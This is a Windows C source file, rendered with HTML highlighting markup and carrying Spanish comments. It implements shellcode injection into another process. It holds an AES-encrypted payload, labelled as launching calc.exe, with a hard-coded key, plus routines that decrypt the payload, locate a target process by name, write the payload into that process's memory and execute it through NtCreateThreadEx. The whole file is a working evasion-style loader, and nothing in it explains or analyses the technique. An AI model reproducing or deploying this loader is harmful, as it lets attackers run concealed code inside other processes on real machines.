#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;wincrypt.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;psapi.h&gt;</span><span class="cp">
#pragma comment (lib, "user32.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
</span>
<span class="c1">// calc.exe</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x8f</span> <span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
<span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xc3</span> <span class="p">};</span>

<span class="c1">// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_CLIENT_ID</span> <span class="p">{</span>
	<span class="n">HANDLE</span> <span class="n">UniqueProcess</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">UniqueThread</span><span class="p">;</span>
<span class="p">}</span> <span class="n">CLIENT_ID</span><span class="p">,</span> <span class="o">*</span><span class="n">PCLIENT_ID</span><span class="p">;</span>

<span class="k">typedef</span> <span class="nf">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">VirtualAlloc_t</span><span class="p">)(</span>
	<span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
	<span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">flProtect</span><span class="p">);</span>
	
<span class="k">typedef</span> <span class="nf">VOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">RtlMoveMemory_t</span><span class="p">)(</span>
	<span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Destination</span><span class="p">,</span> 
	<span class="k">const</span> <span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Source</span><span class="p">,</span> 
	<span class="n">SIZE_T</span> <span class="n">Length</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">FARPROC</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">RtlCreateUserThread_t</span><span class="p">)(</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PSECURITY_DESCRIPTOR</span> <span class="n">SecurityDescriptor</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">BOOLEAN</span> <span class="n">CreateSuspended</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">StackReserved</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">StackCommit</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartParameter</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">ThreadHandle</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PCLIENT_ID</span> <span class="n">ClientId</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">NTSTATUS</span> <span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span> <span class="n">NtCreateThreadEx_t</span><span class="p">)(</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">hThread</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ACCESS_MASK</span> <span class="n">DesiredAccess</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">ObjectAttributes</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpStartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpParameter</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackCommit</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackReserve</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PVOID</span> <span class="n">lpBytesBuffer</span><span class="p">);</span>


<span class="k">extern</span> <span class="s">"C"</span> <span class="p">{</span>

<span class="kt">int</span> <span class="n">AESDecrypt</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">keylen</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">HCRYPTPROV</span> <span class="n">hProv</span><span class="p">;</span>
        <span class="n">HCRYPTHASH</span> <span class="n">hHash</span><span class="p">;</span>
        <span class="n">HCRYPTKEY</span> <span class="n">hKey</span><span class="p">;</span>
		<span class="n">DWORD</span> <span class="o">*</span> <span class="n">pointer_len</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">payload_len</span><span class="p">;</span> 
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptAcquireContextW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hProv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PROV_RSA_AES</span><span class="p">,</span> <span class="n">CRYPT_VERIFYCONTEXT</span><span class="p">)){</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptCreateHash</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_SHA_256</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hHash</span><span class="p">)){</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptHashData</span><span class="p">(</span><span class="n">hHash</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">keylen</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>              
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDeriveKey</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_AES_256</span><span class="p">,</span> <span class="n">hHash</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">hKey</span><span class="p">)){</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="p">(</span><span class="n">HCRYPTHASH</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">pointer_len</span><span class="p">)){</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">CryptReleaseContext</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">CryptDestroyHash</span><span class="p">(</span><span class="n">hHash</span><span class="p">);</span>
        <span class="n">CryptDestroyKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>  
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="n">FindProcess</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">procname</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">HANDLE</span> <span class="n">hProcSnap</span><span class="p">;</span>
        <span class="n">PROCESSENTRY32</span> <span class="n">pe32</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">hProcSnap</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span><span class="c1">//se crear un snapshot de los procesos en ejecución del sistema operativo</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span> <span class="o">==</span> <span class="n">hProcSnap</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
                
        <span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span> <span class="c1">// se obtiene el tamaño total del objeo definido</span>
                
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// validación del snapshot creado</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
                
        <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// iteración del snapshot</span>
				<span class="n">printf</span><span class="p">(</span><span class="s">"[FindProcess: ] %s </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">lstrcmpiA</span><span class="p">(</span><span class="n">procname</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// comprobación del nombre del proceso</span>
                        <span class="n">pid</span> <span class="o">=</span> <span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span> <span class="c1">// obtención del pid del proceso</span>
						<span class="n">printf</span><span class="p">(</span><span class="s">"Process Found!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                        <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
                
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span> <span class="c1">//se cierra el snapshot</span>
                
        <span class="k">return</span> <span class="n">pid</span><span class="p">;</span> <span class="c1">// retorno de pid</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="n">Inject</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProc</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">)</span> <span class="p">{</span>

	<span class="n">LPVOID</span> <span class="n">pRemoteCode</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">CLIENT_ID</span> <span class="n">cid</span><span class="p">;</span>
	<span class="c1">// Inyeccion tipo2 pNtCreateThreadEx</span>
	<span class="n">NtCreateThreadEx_t</span> <span class="n">pNtCreateThreadEx</span> <span class="o">=</span> <span class="p">(</span><span class="n">NtCreateThreadEx_t</span><span class="p">)</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"NTDLL.DLL"</span><span class="p">),</span> <span class="s">"NtCreateThreadEx"</span><span class="p">);</span>
	<span class="n">AESDecrypt</span><span class="p">((</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
	<span class="n">pRemoteCode</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">);</span>
	<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span> <span class="o">*</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="c1">// Inyeccion tipo2 pNtCreateThreadEx</span>
	<span class="n">pNtCreateThreadEx</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hThread</span><span class="p">,</span> <span class="n">GENERIC_ALL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">hProc</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="mi">500</span><span class="p">);</span>
			<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
			<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
	
